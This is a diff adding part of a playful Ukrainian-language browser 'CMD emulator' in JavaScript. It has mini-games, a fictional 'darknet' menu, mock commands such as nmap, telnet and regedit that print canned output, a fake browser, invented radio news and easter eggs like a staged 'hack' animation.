+    }
+    // Active 2048
+    if(darkGame==='2048'){
+      if(r2==='w')move2048('up');else if(r2==='s')move2048('down');
+      else if(r2==='a')move2048('left');else if(r2==='d')move2048('right');
+      return;
+    }
+    // Active survive
+    if(darkGame==='survive'){
+      var loc2=surviveMap[surviveState.location];
+      if(loc2&&loc2.exits){
+        if((r2==='n')&&loc2.exits.n){surviveState.location=loc2.exits.n;surviveState.turn++;surviveState.hp-=rnd(10);}
+        else if((r2==='s')&&loc2.exits.s){surviveState.location=loc2.exits.s;surviveState.turn++;surviveState.hp-=rnd(5);}
+        else if((r2==='e')&&loc2.exits.e){surviveState.location=loc2.exits.e;surviveState.turn++;surviveState.hp-=rnd(8);}
+        else if((r2==='w')&&loc2.exits.w){surviveState.location=loc2.exits.w;surviveState.turn++;surviveState.hp-=rnd(5);}
+        else if(r2.startsWith('take ')){var itm=r2.slice(5).trim();var ii=loc2.items.indexOf(itm);if(ii!==-1){surviveState.inventory.push(itm);surviveState.found.push(itm);}}
+        else if(r2==='look'){}
+      }
+      if(surviveState.hp<=0){surviveState.hp=0;}
+      renderSurvive();return;
+    }
+    // Cipher input
+    if(darkGame==='cipher_input'){
+      if(raw.toUpperCase()===window._cipherAnswer){
+        clrClass('dark-row');addDX('  ✅ ПРАВИЛЬНО! "'+window._cipherAnswer+'"','#0f0');
+        addDX('  CipherQuest пройдено!','#ffff00');addDX('  [назад] до ігор','#333');
+      }else{
+        clrClass('dark-row');addDX('  ❌ Неправильно. Спробуй ще.','#ff5555');
+        addDX('  Підказка: зсув 3 (А→D, B→E...)','#555');
+        darkGame='cipher_input';
+      }
+      darkGame=null;ow.scrollTop=ow.scrollHeight;return;
+    }
+    if(darkGame==='hacksim'){return;}
+    // Section navigation
+    if(r2==='1'||r2==='horror'||r2==='жах'){renderDarknet('horror');return;}
+    if(r2==='2'||r2==='forum'){renderDarknet('forum');return;}
+    if(r2==='3'||r2==='files'){renderDarknet('files');return;}
+    if(r2==='4'||r2==='chat'){renderDarknet('chat');return;}
+    if(r2==='5'||r2==='market'){renderDarknet('market');return;}
+    if(r2==='6'||r2==='games'){renderDarknet('games');return;}
+    if(r2==='7'||r2==='hacker'){renderDarknet('hacker');return;}
+    if(r2==='8'||r2==='wiki'){renderDarknet('wiki');return;}
+    if((r2==='next'||r2==='наступна')&&darknetPage==='horror'){darkStoryIdx++;renderDarknet('horror');return;}
+    // Wiki articles
+    if(r2.startsWith('wiki ')&&darknetPage==='wiki'){
+      var wnum=r2.slice(5).trim(),wart=wikiArticles[wnum];
+      if(wart){clrClass('dark-row');addDX('  ┌──────────────────────────────────────┐','#0f0');
+        wart.split('\n').forEach(function(l){addDX('  '+l,l.indexOf('──')!==-1?'#333':l===wart.split('\n')[0]?'#ff5555':'#ccc');});
+        addDX('  └──────────────────────────────────────┘','#0f0');addDX('  [назад] до вікі','#333');
+      }else renderDarknet('wiki');ow.scrollTop=ow.scrollHeight;return;
+    }
+    // Hacker tools
+    if(r2.startsWith('tool ')&&darknetPage==='hacker'){
+      var tnum=r2.slice(5).trim(),tmsgs=hackToolMsgs[tnum];
+      if(tmsgs){clrClass('dark-row');addDX('  💻 ІНСТРУМЕНТ #'+tnum,'#ff5555');addDX('  ⚠️  ЛИШЕ СИМУЛЯЦІЯ','#ff8800');
+        var tmi=0,tiv=setInterval(function(){
+          if(tmi>=tmsgs.length){clearInterval(tiv);addDX('  [назад] до інструментів','#333');ow.scrollTop=ow.scrollHeight;return;}
+          addDX('  > '+tmsgs[tmi],'#0f0');tmi++;ow.scrollTop=ow.scrollHeight;
+        },400);
+      }else renderDarknet('hacker');return;
+    }
+    // Games commands
+    if(r2==='play maze'){renderDarknet('games');startMaze();return;}
+    if(r2==='play hack'){renderDarknet('games');startHackSim();return;}
+    if(r2==='play survive'){renderDarknet('games');startSurvive();return;}
+    if(r2==='play 2048'){renderDarknet('games');init2048();return;}
+    if(r2==='play slots'){playDarkSlots();return;}
+    if(r2.startsWith('download ')){darkDownload(r2.slice(9).trim());return;}
+    if(r2.startsWith('run ')){runDownloadedGame(r2.slice(4).trim());return;}
+    // File reading
+    if(darkFileContents[r2]&&darknetPage==='files'){
+      clrClass('dark-row');addDX('  ┌──────────────────────────────────────┐','#0f0');
+      darkFileContents[r2].split('\n').forEach(function(l){addDX('  '+l,'#ccc');});
+      addDX('  └──────────────────────────────────────┘','#0f0');addDX('  [назад] повернутись','#333');
+      ow.scrollTop=ow.scrollHeight;return;
+    }
+    // Chat
+    if(darknetPage==='chat'){
+      var chatResp=['<VOID>: цікаво що ти написав це.','<UNKNOWN>: ми отримали повідомлення.','<SHADOW>: ти не перший.','<VOID>: "'+raw+'"... ми запам\'ятали.','<????>: продовжуй. нам подобається.'];
+      renderDarknet('chat');
+      addDX('  <ТИ>: '+raw,'#aaffaa');
+      addDX('  '+chatResp[rnd(chatResp.length)],'#ff5555');
+      ow.scrollTop=ow.scrollHeight;return;
+    }
+    renderDarknet(darknetPage);return;
+  }
+
+  // Telnet mode
+  if(gameMode==='telnet'){
+    if(raw==='стоп'||raw==='stop'||raw==='exit'||raw==='вих'){
+      pr2('Підключення закрито.','warn');gameMode=null;
+    } else {
+      pr2('bash: '+raw+': command not found','err');
+    }
+    return;
+  }
+
+  // Normal commands
+  var expanded=raw.replace(/%([^%]+)%/g,function(_,k){return env[k.toUpperCase()]||'';});
+  expanded.split('&&').forEach(function(part){
+    part=part.trim();
+    var tokens=tok(part.split('|')[0].trim());
+    if(!tokens.length)return;
+    var cmd=tokens[0].toLowerCase(),args=tokens.slice(1);
+    if(C[cmd])C[cmd](args,part);
+    else if(/^[a-z]:$/i.test(cmd))pr2('Диск не знайдено.','err');
+    else pr2("Команда '"+tokens[0]+"' не знайдена.\nВведіть 'допомога' для списку команд.",'err');
+  });
+}
+
+// ===== INPUT =====
+function sendCmd(){
+  var val=ci.value.trim();
+  ci.value='';
+  if(!val)return;
+  echocmd(val);
+  if(gameMode!=='guess'){hist.unshift(val);hidx=-1;curLine='';}
+  exec(val);
+  ci.focus();
+}
+
+ci.addEventListener('keydown',function(e){
+  if(e.key==='Enter'||e.keyCode===13){e.preventDefault();sendCmd();return;}
+  if(!gameMode){
+    if(e.key==='ArrowUp'){e.preventDefault();if(hidx===-1)curLine=ci.value;if(hidx<hist.length-1){hidx++;ci.value=hist[hidx];}}
+    if(e.key==='ArrowDown'){e.preventDefault();if(hidx>0){hidx--;ci.value=hist[hidx];}else if(hidx===0){hidx=-1;ci.value=curLine;}}
+  }
+  if(e.ctrlKey&&e.key==='c'){e.preventDefault();C['стоп']();ci.value='';pr2('^C');}
+});
+
+// Mobile: also handle input event as fallback
+ci.addEventListener('keyup',function(e){if(e.key==='Enter'||e.keyCode===13){sendCmd();}});
+
+function boot(){
+  pr2('Microsoft Windows [Версія 10.0.19045.4170]');
+  pr2('(c) Microsoft Corporation. Всі права захищені.\n');
+  pr2('  Введіть допомога  — список команд','info');
+  pr2('  тв │ радіо │ казино │ змійка │ тетріс','warn');
+  pr2('');
+  upPr();
+}
+
+// ===== НОВІ СИСТЕМНІ КОМАНДИ =====
+C['regedit']=C['регедіт']=function(){
+  pr2('\n📋 РЕДАКТОР РЕЄСТРУ Windows','warn');
+  pr2('─────────────────────────────────────────');
+  pr2('HKEY_LOCAL_MACHINE');
+  pr2('  └─ SOFTWARE');
+  pr2('       └─ Microsoft');
+  pr2('            ├─ Windows NT');
+  pr2('            │    └─ CurrentVersion');
+  pr2('            │         ProductName = "Windows 10 Pro"');
+  pr2('            │         BuildLab    = "19045.vb_release"');
+  pr2('            └─ Internet Explorer');
+  pr2('                 Version = "11.0.19041.1"');
+  pr2('HKEY_CURRENT_USER');
+  pr2('  └─ Software\\Microsoft\\Windows\\CurrentVersion');
+  pr2('       └─ Run (автозапуск)');
+  pr2('\n⚠️  Увага: зміни реєстру можуть пошкодити систему!','err');
+};
+
+C['msconfig']=function(){
+  pr2('\n⚙️  КОНФІГУРАЦІЯ СИСТЕМИ','warn');
+  pr2('═══════════════════════════════════════');
+  pr2('  Завантаження:  Нормальне завантаження');
+  pr2('  ОС:            Windows 10 Pro (за замовчуванням)');
+  pr2('  Час очікув.:   30 сек');
+  pr2('\n  Служби що запускаються:');
+  ['Windows Audio','DHCP Client','DNS Client','Windows Update','Windows Defender','Print Spooler'].forEach(function(s){pr2('  [✓] '+s,'ok');});
+  pr2('\n  Автозапуск:');
+  ['Explorer.exe','ctfmon.exe','OneDrive.exe'].forEach(function(s){pr2('  [✓] '+s,'info');});
+};
+
+C['defrag']=function(a){
+  var d=(a[0]||'C:').toUpperCase();
+  pr2('\n🔧 ДЕФРАГМЕНТАЦІЯ ДИСКУ '+d,'info');
+  pr2('──────────────────────────────────────');
+  var p=0,iv=setInterval(function(){
+    p+=rnd(8)+3;
+    if(p>=100){p=100;clearInterval(iv);
+      pr2('████████████████████████ 100%','ok');
+      pr2('\nДефрагментацію завершено!','ok');
+      pr2('Фрагментів до: 12%  →  після: 0%\n');
+      sb();return;
+    }
+    var bar=Math.floor(p/4);
+    pr2('['+'█'.repeat(bar)+'░'.repeat(25-bar)+'] '+p+'%','warn');
+    sb();
+  },300);
+};
+
+C['telnet']=function(a){
+  var host=a[0]||'localhost';
+  pr2('\nПідключення до '+host+' ...','info');
+  setTimeout(function(){
+    pr2('Підключено до '+host+'.','ok');
+    pr2('Escape character is \'^]\'.\n');
+    pr2('Ubuntu 22.04.3 LTS');
+    pr2('login: _','info');
+    pr2('\n(симуляція — введіть "стоп" для виходу)','warn');
+    gameMode='telnet';
+  },800);
+};
+
+C['nmap']=function(a){
+  var host=a[0]||'192.168.1.1';
+  pr2('\nStarting Nmap 7.94 ( https://nmap.org )','info');
+  pr2('Scanning '+host+' ...');
+  var ports=[
+    {p:22,s:'ssh',st:'open'},
+    {p:80,s:'http',st:'open'},
+    {p:443,s:'https',st:'open'},
+    {p:3306,s:'mysql',st:'filtered'},
+    {p:8080,s:'http-proxy',st:'closed'},
+  ];
+  setTimeout(function(){
+    pr2('PORT     STATE    SERVICE');
+    ports.forEach(function(x){
+      var c=x.st==='open'?'ok':x.st==='filtered'?'warn':'err';
+      pr2(String(x.p+'/tcp').padEnd(9)+x.st.padEnd(9)+x.s,c);
+    });
+    pr2('\nNmap done: 1 IP address (1 host up) scanned in 2.34 seconds\n','ok');
+    sb();
+  },1000);
+};
+
+C['netcat']=C['nc']=function(a){
+  pr2('Використання: nc [хост] [порт]');
+  if(a.length>=2){pr2('\nПідключення до '+a[0]+':'+a[1]+' ...','info');setTimeout(function(){pr2('З\'єднання встановлено.\n(симуляція)','ok');sb();},600);}
+};
+
+C['погода']=C['weather']=function(a){
+  var city=a.join(' ')||'Київ';
+  var cond=['Сонячно ☀️','Хмарно ☁️','Дощ 🌧️','Гроза ⛈️','Сніг ❄️','Туман 🌫️'][rnd(6)];
+  var temp=rnd(35)-5;
+  pr2('\n🌍 Погода: '+city,'info');
+  pr2('─────────────────────────────');
+  pr2('  '+cond);
+  pr2('  Температура:  '+temp+'°C');
+  pr2('  Відчувається: '+(temp-rnd(5))+'°C');
+  pr2('  Вологість:    '+( rnd(40)+40)+'%');
+  pr2('  Вітер:        '+rnd(20)+' км/год');
+  pr2('  Тиск:         '+(rnd(20)+750)+' мм рт.ст.');
+  pr2('─────────────────────────────\n');
+};
+
+C['календар']=C['calendar']=function(){
+  var n=new Date();
+  var months=['Січень','Лютий','Березень','Квітень','Травень','Червень','Липень','Серпень','Вересень','Жовтень','Листопад','Грудень'];
+  var days=['Нд','Пн','Вт','Ср','Чт','Пт','Сб'];
+  pr2('\n📅 '+months[n.getMonth()]+' '+n.getFullYear(),'info');
+  pr2(' Нд  Пн  Вт  Ср  Чт  Пт  Сб');
+  pr2('─────────────────────────────');
+  var first=new Date(n.getFullYear(),n.getMonth(),1).getDay();
+  var last=new Date(n.getFullYear(),n.getMonth()+1,0).getDate();
+  var row='';
+  for(var i=0;i<first;i++)row+='     ';
+  for(var d=1;d<=last;d++){
+    var mark=d===n.getDate()?'['+String(d).padStart(2,' ')+']':' '+String(d).padStart(2,' ')+'  ';
+    row+=mark;
+    if((first+d)%7===0||d===last){pr2(row);row='';}
+  }
+  pr2('─────────────────────────────\n');
+};
+
+C['нотатник']=C['notepad']=function(a,raw){
+  var text=raw.replace(/^(нотатник|notepad)\s*/i,'').trim();
+  if(!text){
+    pr2('\n📝 НОТАТНИК\nВикористання: нотатник <текст>\nПриклад: нотатник Привіт світ!','info');
+    return;
+  }
+  // Save to virtual FS
+  var desktop=gdc('C:\\Users\\User\\Desktop');
+  if(!desktop)desktop={};
+  var fname='note_'+Date.now()+'.txt';
+  desktop[fname]={type:'file',size:text.length,date:fd(new Date())+' '+ft(new Date()),content:text};
+  pr2('\n📝 Збережено: Desktop\\'+fname,'ok');
+  pr2('Вміст: '+text);
+};
+
+C['калькулятор']=C['calculator']=function(){
+  pr2('\n🔢 КАЛЬКУЛЯТОР','info');
+  pr2('Введіть вираз після "кал":');
+  pr2('  кал 2+2        = 4');
+  pr2('  кал 10*5-3     = 47');
+  pr2('  кал 2^10       = 1024');
+  pr2('  кал (5+3)*2    = 16\n');
+};
+
+// ===== НОВИНИ В РАДІО =====
+var NEWS_UA=[
+  ['🔴 НОВИНИ УТ-1',
+   'Верховна Рада прийняла новий\nзакон про цифрову економіку.\nЗа — 287 голосів.',
+   'Президент підписав указ про\nрозвиток ІТ-галузі в Україні.\nОчікується зростання на 15%.',
+   'Київ увійшов до топ-10 міст\nЄвропи за розвитком стартапів.',
+   'НБУ зберіг облікову ставку\nна рівні 13.5% річних.',
+   'Погода на завтра: тепло,\nсонячно, без опадів.\nТемпература +22°C.'],
+  ['📡 ХІТ FM НОВИНИ',
+   'Новий альбом Imagine Dragons\nвже доступний на всіх платформах.',
+   'Концерт Ed Sheeran у Варшаві\nзбере 50 000 глядачів.',
+   'Spotify оголосив топ-10 пісень\nтижня в Україні.',
+   'Музичний фестиваль Atlas Weekend\nоголосив хедлайнерів сезону.'],
+  ['🎸 РОКС FM НОВИНИ',
+   'AC/DC анонсували новий тур\nпо Європі на 2025 рік.',
+   'Metallica випустила ремастер\nальбому Master of Puppets.',
+   'Легендарний гурт Queen\nвідновлює концертну діяльність.',
+   'Rock in Rio зберуть мільйон\nглядачів цього літа.'],
+  ['🎼 КЛАСИК РАДІО — НОВИНИ КУЛЬТУРИ',
+   'Київська філармонія представляє\nновий сезон концертів 2024.',
+   'Виставка Бетховена відкрилась\nу Національному музеї України.',
+   'Молодий піаніст з Харкова\nздобув першу премію у Відні.',
+   'Опера "Аїда" повертається\nна сцену Національної опери.'],
+  ['🎵 ШАНСОН ПЛЮС — НОВИНИ',
+   'Новий кліп набрав мільйон\nпереглядів за перший день.',
+   'Гастрольний тур артиста\nохопить 12 міст України.',
+   'Фестиваль шансону відбудеться\nу серпні в Одесі.',
+   'Ретро-вечір у київському клубі\nзберуть зірок жанру.'],
+];
+
+var newsState={st:0,idx:0,charIdx:0,typing:false,typingIv:null,beepIv:null};
+
+function playNewsBeep(){
+  if(!audioCtx||audioCtx.state==='suspended')return;
+  try{
+    var o=audioCtx.createOscillator(),g=audioCtx.createGain();
+    o.type='sine';o.frequency.value=1000;
+    g.gain.setValueAtTime(0.08,audioCtx.currentTime);
+    g.gain.exponentialRampToValueAtTime(0.001,audioCtx.currentTime+0.08);
+    o.connect(g);g.connect(audioCtx.destination);
+    o.start();o.stop(audioCtx.currentTime+0.08);
+  }catch(e){}
+}
+
+function startNewsTyping(stIdx){
+  if(newsState.typingIv)clearInterval(newsState.typingIv);
+  if(newsState.beepIv)clearInterval(newsState.beepIv);
+  var news=NEWS_UA[stIdx];
+  var block=news[newsState.idx%news.length];
+  newsState.idx++;
+  var lines=block.split('\n');
+  // Remove old news rows
+  clrClass('news-row');
+  // Title
+  var titleEl=document.createElement('div');
+  titleEl.className='line radio-row news-row';
+  titleEl.style.color='#ff5555';
+  titleEl.textContent='  ┌──── НОВИНИ ────────────────────┐';
+  ow.appendChild(titleEl);
+  // Type each line char by char
+  var fullText=lines.join('\n');
+  var chars=Array.from(fullText);
+  var ci2=0;
+  var contentEl=document.createElement('div');
+  contentEl.className='line radio-row news-row';
+  contentEl.style.color='#ffffff';
+  contentEl.style.whiteSpace='pre-wrap';
+  contentEl.textContent='  ';
+  ow.appendChild(contentEl);
+  var endEl=document.createElement('div');
+  endEl.className='line radio-row news-row';
+  endEl.style.color='#ff5555';
+  endEl.textContent='  └────────────────────────────────┘';
+  ow.appendChild(endEl);
+
+  newsState.typingIv=setInterval(function(){
+    if(gameMode!=='radio'){clearInterval(newsState.typingIv);return;}
+    if(ci2>=chars.length){clearInterval(newsState.typingIv);return;}
+    contentEl.textContent='  '+fullText.slice(0,ci2+1);
+    if(chars[ci2]!==' '&&chars[ci2]!=='\n')playNewsBeep();
+    ci2++;
+    ow.scrollTop=ow.scrollHeight;
+  },55);
+}
+
+// ===== БРАУЗЕР =====
+var browserHistory=[];
+var BROWSER_PAGES={
+  'google.com':{title:'Google',content:['┌─────────────────────────────────────┐','│                                     │','│           G o o g l e               │','│                                     │','│  ┌───────────────────────────────┐  │','│  │ 🔍 Пошук або введіть URL    │  │','│  └───────────────────────────────┘  │','│                                     │','│  [Пошук Google]  [Мені пощастить]   │','│                                     │','│  © 2024 Google LLC                  │','└─────────────────────────────────────┘']},
+  'youtube.com':{title:'YouTube',content:['┌─────────────────────────────────────┐','│ ▶ YouTube                    🔍 ≡  │','├─────────────────────────────────────┤','│ РЕКОМЕНДОВАНО:                      │','│ ┌──────┐ Кот грає на піаніно 🐱    │','│ │ ▶▶  │ 12M переглядів             │','│ └──────┘                            │','│ ┌──────┐ Як зробити CMD в HTML     │','│ │ ▶▶  │ 420K переглядів            │','│ └──────┘                            │','│ ┌──────┐ Найкращі ігри 2024        │','│ │ ▶▶  │ 8.5M переглядів            │','└─────────────────────────────────────┘']},
+  'github.com':{title:'GitHub',content:['┌─────────────────────────────────────┐','│ 🐙 GitHub                    + Q   │','├─────────────────────────────────────┤','│ Trending repositories:              │','│                                     │','│ ⭐ microsoft/vscode    145k ★       │','│ ⭐ torvalds/linux      172k ★       │','│ ⭐ anthropics/claude    89k ★       │','│ ⭐ cmd-emulator/html    42k ★       │','│                                     │','│ Pull requests  Issues  Marketplace  │','└─────────────────────────────────────┘']},
+  'wikipedia.org':{title:'Wikipedia',content:['┌─────────────────────────────────────┐','│ Wikipedia — Вільна енциклопедія     │','├─────────────────────────────────────┤','│                                     │','│ Стаття дня:                         │','│ Командний рядок (Command Line       │','│ Interface, CLI) — текстовий         │','│ інтерфейс для взаємодії з           │','│ операційною системою через          │','│ введення текстових команд.          │','│                                     │','│ Детальніше... | Редагувати          │','└─────────────────────────────────────┘']},
+  'news.ua':{title:'Новини України',content:['┌─────────────────────────────────────┐','│ 📰 НОВИНИ УКРАЇНИ                   │','├─────────────────────────────────────┤','│ 🔴 ТЕРМІНОВО:                       │','│ Рада прийняла новий закон           │','│                                     │','│ 📌 Економіка зростає на 4.2%       │','│ 📌 Динамо перемогло 3:1            │','│ 📌 Новий IT-кампус у Львові        │','│ 📌 Погода: +22°C, сонячно          │','│                                     │','│ [Читати більше...]                  │','└─────────────────────────────────────┘']},
+  'error':{title:'404 Not Found',content:['┌─────────────────────────────────────┐','│                                     │','│         404  NOT FOUND              │','│                                     │','│  Сторінку не знайдено.             │','│                                     │','│  Можливо ви мали на увазі:         │','│    google.com                       │','│    youtube.com                      │','│    wikipedia.org                    │','│                                     │','└─────────────────────────────────────┘']},
+};
+
+C['браузер']=C['browser']=C['ie']=function(a){
+  var url=(a[0]||'google.com').toLowerCase().replace(/^https?:\/\//,'').replace(/\/.*$/,'');
+  browserHistory.push(url);
+  var page=BROWSER_PAGES[url]||BROWSER_PAGES['error'];
+  pr2('\n╔══════════════════════════════════════╗','#4444ff');
+  pr2('║ 🌐 Internet Explorer  ─  □  ×        ║','#4444ff');
+  pr2('╠══════════════════════════════════════╣','#4444ff');
+  pr2('║ 🔙  📄 http://'+url.padEnd(26)+'║','#888');
+  pr2('╠══════════════════════════════════════╣','#4444ff');
+  pr2('║  '+page.title.padEnd(38)+'║','#ffff55');
+  pr2('╠══════════════════════════════════════╣','#4444ff');
+  page.content.forEach(function(l){pr2('║  '+l.padEnd(38)+'║','#c0c0c0');});
+  pr2('╠══════════════════════════════════════╣','#4444ff');
+  pr2('║  Готово                    Internet  ║','#888');
+  pr2('╚══════════════════════════════════════╝\n','#4444ff');
+  if(secretFound.indexOf('browser')===-1&&url!=='error'){
+    secretFound.push('browser');
+    pr2('🔓 СЕКРЕТ: "браузер"  +10 очок!','warn');
+  }
+};
+
+C['history']=C['журнал']=function(){
+  if(!browserHistory.length){pr2('Журнал браузера порожній.','warn');return;}
+  pr2('\n🌐 Журнал браузера:','info');
+  browserHistory.forEach(function(u,i){pr2('  '+(i+1)+'. '+u);});
+  pr2('');
+};
+
+// ===== СЕКРЕТНІ КОМАНДИ (EASTER EGGS) =====
+var secretFound=[];
+
+C['hello']=C['привіт']=function(){
+  pr2('\n👋 Привіт! Я CMD емулятор.','ok');
+  pr2('Створений з любов\'ю в HTML/JS.','info');
+  pr2('Введи "про" щоб дізнатися більше.\n');
+  if(secretFound.indexOf('hello')===-1){secretFound.push('hello');pr2('🔓 СЕКРЕТ РОЗКРИТО: "hello"  +10 очок!','warn');}
+};
+
+C['про']=C['about']=function(){
+  pr2('\n╔══════════════════════════════════╗','warn');
+  pr2('║   CMD ЕМУЛЯТОР  v3.0             ║','warn');
+  pr2('║   Створено: 2024                 ║','warn');
+  pr2('║   Мова: HTML + CSS + JavaScript  ║','warn');
+  pr2('║   Розмір: ~60KB офлайн           ║','warn');
+  pr2('║                                  ║','warn');
+  pr2('║   Команд: 60+                    ║','warn');
+  pr2('║   Ігор: 5                        ║','warn');
+  pr2('║   Секретів: 10 👀                ║','warn');
+  pr2('╚══════════════════════════════════╝','warn');
+  if(secretFound.indexOf('about')===-1){secretFound.push('about');pr2('\n🔓 СЕКРЕТ: "про" +10 очок!','warn');}
+};
+
+C['secrets']=C['секрети']=function(){
+  var all=['hello','sudo','hack','credits','rickroll','konami','глюк','cat','flip','browser','42','пасхалка','neo','boom'];
+  pr2('\n🔐 СЕКРЕТНІ КОМАНДИ:','warn');
+  pr2('  Знайдено: '+secretFound.length+'/'+all.length+'\n','info');
+  all.forEach(function(h,i){pr2('  '+(i+1)+'. '+(secretFound.indexOf(h)!==-1?'✅ '+h:'❓ ???'));});
+  pr2('');
+};
+
+C['boom']=function(){
+  var frames=['💥','🔥💥','🔥🔥💥','💥🔥💥🔥','BOOM! 💥🔥💥'];
+  var i=0,iv=setInterval(function(){
+    if(i>=frames.length){clearInterval(iv);
+      pr2('\nМожна було просто ввести "жарт" 😄\n','ok');
+      if(secretFound.indexOf('boom')===-1){secretFound.push('boom');pr2('🔓 СЕКРЕТ: "boom"  +10 очок!','warn');}
+      sb();return;}
+    pr2(frames[i],'warn');i++;sb();
+  },300);
+};
+
+C['42']=function(){
+  pr2('\n🌌 42 — Відповідь на головне питання','warn');
+  pr2('   Всесвіту, Життя і Всього іншого.','warn');
+  pr2('   (Автостопом по Галактиці — Дуглас Адамс)\n','info');
+  if(secretFound.indexOf('42')===-1){secretFound.push('42');pr2('🔓 СЕКРЕТ: "42"  +10 очок!','warn');}
+};
+
+C['пасхалка']=C['easter']=function(){
+  pr2('\n🥚 Ти знайшов пасхалку всередині пасхалки!','ok');
+  pr2('   Це як сон уві сні... 🌀\n','info');
+  if(secretFound.indexOf('пасхалка')===-1){secretFound.push('пасхалка');pr2('🔓 СЕКРЕТ: "пасхалка"  +10 очок!','warn');}
+};
+
+C['neo']=function(){
+  pr2('\n💊 Яку таблетку обираєш?\n','warn');
+  pr2('  🔵 синя   — залишаєшся в CMD','info');
+  pr2('  🔴 червона — дізнаєшся правду\n','err');
+  setTimeout(function(){
+    pr2('Ти обрав червону...','err');
+    pr2('Ласкаво просимо в реальний світ, Neo.\n','ok');
+    if(secretFound.indexOf('neo')===-1){secretFound.push('neo');pr2('🔓 СЕКРЕТ: "neo"  +10 очок!','warn');}
+    sb();
+  },2000);
+};
+
+C['sudo']=function(a){
+  pr2('sudo: ви не в sudoers файлі.','err');
+  pr2('Цей інцидент буде повідомлено.\n','warn');
+  setTimeout(function(){
+    pr2('Kidding! 😄 Ласкаво просимо, root!','ok');
+    pr2('root@PC-USER:~#','warn');
+    if(secretFound.indexOf('sudo')===-1){secretFound.push('sudo');pr2('🔓 СЕКРЕТ: "sudo"  +10 очок!','warn');}
+    sb();
+  },1500);
+};
+
+C['hack']=function(){
+  pr2('\n💀 ІНІЦІАЛІЗАЦІЯ ХАКУ...','err');
+  var steps=['[>] Сканування цілі...','[>] Обхід фаєрволу...','[>] Ін\'єкція payload...','[>] Ескалація привілеїв...','[>] Чищення логів...','[✓] ДОСТУП ОТРИМАНО 😈'];
+  var i=0,iv=setInterval(function(){
+    if(i>=steps.length){clearInterval(iv);
+      pr2('\nJUST KIDDING! 😄\nЦе просто CMD емулятор :)','ok');
+      if(secretFound.indexOf('hack')===-1){secretFound.push('hack');pr2('🔓 СЕКРЕТ: "hack"  +10 очок!','warn');}
+      sb();return;}
+    pr2(steps[i],'warn');i++;sb();
+  },600);
+};
+
+C['credits']=C['автор']=function(){
+  pr2('\n★ ═══════════════════════════ ★','warn');
+  pr2('        CMD ЕМУЛЯТОР v3.0','ok');
+  pr2('★ ═══════════════════════════ ★\n','warn');
+  pr2('  Розробка: Claude (Anthropic AI)','info');
+  pr2('  Ідея: Roman 💡','info');
+  pr2('  Технології: HTML5, CSS3, JS, Web Audio API','info');
+  pr2('  Версія: 3.0 (офлайн, без залежностей)','info');
+  pr2('\n  "Найкращий емулятор терміналу\n   в одному HTML файлі!" 🏆\n','ok');
+  if(secretFound.indexOf('credits')===-1){secretFound.push('credits');pr2('🔓 СЕКРЕТ: "credits"  +10 очок!','warn');}
+};
+
+C['rickroll']=function(){
+  pr2('\n🎵 Never gonna give you up,','ok');
+  pr2('🎵 Never gonna let you down,','ok');
+  pr2('🎵 Never gonna run around and desert you!','ok');
+  pr2('🎵 Never gonna make you cry,','ok');
+  pr2('🎵 Never gonna say goodbye,','ok');
+  pr2('🎵 Never gonna tell a lie and hurt you!\n','ok');
+  pr2('  ┌──────────────────────┐');
+  pr2('  │  🎤 Rick Astley 1987 │');
+  pr2('  └──────────────────────┘\n');
+  if(secretFound.indexOf('rickroll')===-1){secretFound.push('rickroll');pr2('🔓 СЕКРЕТ: "rickroll"  +10 очок!','warn');}
+};
+
+var konamiSeq=[],konamiCode=['ArrowUp','ArrowUp','ArrowDown','ArrowDown','ArrowLeft','ArrowRight','ArrowLeft','ArrowRight','b','a'];
+document.addEventListener('keydown',function(e){
+  konamiSeq.push(e.key);
+  if(konamiSeq.length>10)konamiSeq.shift();
+  if(JSON.stringify(konamiSeq)===JSON.stringify(konamiCode)){
+    pr2('\n🎮 KONAMI CODE АКТИВОВАНО!','warn');
+    pr2('↑↑↓↓←→←→BA','ok');
+    pr2('+30 lives!  +1000 грн казино!\n','ok');
+    money+=1000;
+    if(secretFound.indexOf('konami')===-1){secretFound.push('konami');pr2('🔓 СЕКРЕТ: "konami"  +30 очок!','warn');}
+    konamiSeq=[];
+    sb();
+  }
+});
+
+C['конамі']=C['konami']=function(){
+  pr2('🎮 Введи на клавіатурі: ↑↑↓↓←→←→BA','info');
+  pr2('(Konami Code)','warn');
+};
+
+C['глюк']=C['glitch']=function(){
+  pr2('\n⚡ КРИТИЧНА ПОМИЛКА СИСТЕМИ ⚡','err');
+  pr2('KERNEL_DATA_INPAGE_ERROR','err');
+  pr2('*** STOP: 0x0000007A (0x00000000, 0xC000009D)','err');
+  var dots='';
+  var iv=setInterval(function(){
+    dots+='.';
+    clrClass('glitch-row');
+    var el=document.createElement('div');
+    el.className='line glitch-row';
+    el.style.color='#00f';
+    el.style.background='#00f';
+    el.style.color='#fff';
+    el.textContent='  Збирання інформації про помилку'+dots+' '+Math.floor(dots.length*33.3)+'%';
+    ow.appendChild(el);
+    sb();
+    if(dots.length>=3){clearInterval(iv);
+      setTimeout(function(){
+        clrClass('glitch-row');
+        pr2('\nJUST KIDDING! 😄 Система в порядку.','ok');
+        if(secretFound.indexOf('глюк')===-1){secretFound.push('глюк');pr2('🔓 СЕКРЕТ: "глюк"  +10 очок!','warn');}
+        sb();
+      },1000);
+    }
+  },800);
+};
+
+C['cat']=function(a){
+  if(a.length){C['тип'](a);return;}
+  pr2('\n   /\\_/\\  ','ok');
+  pr2('  ( o.o ) ','ok');
+  pr2('   > ^ <  ','ok');
+  pr2('  Meow! 🐱\n','ok');
+  if(secretFound.indexOf('cat')===-1){secretFound.push('cat');pr2('🔓 СЕКРЕТ: "cat"  +10 очок!','warn');}
+};
+
+C['flip']=function(){
+  pr2('(╯°□°）╯︵ ┻━┻','warn');
+  setTimeout(function(){pr2('┬─┬ノ( º _ ºノ)  — спокійно, стіл поставлено назад','ok');sb();},1500);
+  if(secretFound.indexOf('flip')===-1){secretFound.push('flip');pr2('🔓 СЕКРЕТ: "flip"  +10 очок!','warn');}
+};
+
+// Score tracking
+C['рахунок']=C['score']=function(){
+  var all=['hello','sudo','hack','credits','rickroll','konami','глюк','cat','flip','browser','42','пасхалка','neo','boom'];
+  pr2('\n🏆 ВАШ РАХУНОК','warn');
+  pr2('─────────────────────────────');
+  pr2('  Секретів: '+secretFound.length+'/'+all.length,'info');
+  pr2('  Очки: '+secretFound.length*10,'ok');
+  pr2('  Казино: '+money+' грн','info');
+  if(secretFound.length===all.length)pr2('\n  🎉 ВСІ СЕКРЕТИ! Ти легенда!','warn');
+  else pr2('\n  "секрети" — підказки','info');
